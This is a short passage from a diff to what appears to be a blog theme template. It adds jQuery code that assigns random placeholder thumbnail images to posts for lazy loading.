+        locatePost.children('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+
+        locatePost = locatePost.next();
+    }
+</script>
+
+    
+</div>
 
 
                     
